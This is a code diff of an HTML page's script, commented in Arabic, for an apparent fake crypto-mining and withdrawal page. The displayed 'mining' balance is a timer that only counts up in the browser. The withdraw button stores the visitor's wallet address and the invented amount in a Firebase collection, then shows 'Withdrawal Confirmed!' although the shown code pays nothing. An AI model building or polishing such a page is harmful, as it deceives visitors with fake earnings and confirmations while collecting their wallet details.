@@ -28,58 +28,68 @@
 </div>
 
 <script type="module">
+    // استيراد المكتبات بشكل يضمن عمل الزر وعدم تعلقه على Processing
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";
 
+    // إعدادات مشروعك pay-coins التي قمت بنسخها
     const firebaseConfig = {
       apiKey: "AIzaSyCDIizIvd_7nUT6B4sGIc_s-CnZ5hQECCg",
       authDomain: "pay-coins.firebaseapp.com",
       projectId: "pay-coins",
       storageBucket: "pay-coins.firebasestorage.app",
       messagingSenderId: "279908586614",
-      appId: "1:279908586614:web:632ce326f8b3a0e0e47b57"
+      appId: "1:279908586614:web:632ce326f8b3a0e0e47b57",
+      measurementId: "G-SG3W4FH9DC"
     };
 
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
     let balance = 0.0000;
-    let active = true;
+    let miningActive = true;
     const counterDisplay = document.getElementById('counter');
     const usdDisplay = document.getElementById('usd-value');
     const btn = document.getElementById('withdraw-btn');
     const addressInput = document.getElementById('wallet-address');
 
+    // العداد الأصلي
     setInterval(() => {
-        if (active) {
+        if (miningActive) {
             balance += 0.0007; 
             counterDisplay.innerText = balance.toFixed(4);
             usdDisplay.innerText = "≈ $" + balance.toFixed(2);
         }
     }, 100);
 
+    // عملية السحب الأصلية
     btn.addEventListener('click', async () => {
-        const addr = addressInput.value.trim();
-        if (!addr) return;
+        const wallet = addressInput.value.trim();
+        if (!wallet) return;
 
-        active = false;
-        btn.innerText = "Syncing..."; // هنا سيبدأ السحب الحقيقي
+        miningActive = false; 
+        btn.innerText = "Processing..."; // الحالة التي تظهر في صورك
         btn.disabled = true;
 
         try {
-            // هذا السطر سيرسل البيانات فعلياً لمشروع pay-coins
+            // الإرسال لمجموعة withdrawals
             await addDoc(collection(db, "withdrawals"), {
-                address: addr,
+                address: wallet,
                 amount: counterDisplay.innerText,
                 timestamp: serverTimestamp()
             });
 
+            // رسالة النجاح التي تريد رؤيتها
             btn.innerText = "✅ Success!";
-            document.getElementById('status').innerText = "Confirmed in Cloud!";
-        } catch (e) {
-            btn.innerText = "Error!";
+            document.getElementById('status').innerText = "Withdrawal Confirmed!";
+            balance = 0;
+            counterDisplay.innerText = "0.0000";
+            addressInput.value = "";
+
+        } catch (error) {
+            btn.innerText = "Error - Retry";
             btn.disabled = false;
-            active = true;
+            miningActive = true;
         }
     });
 </script>
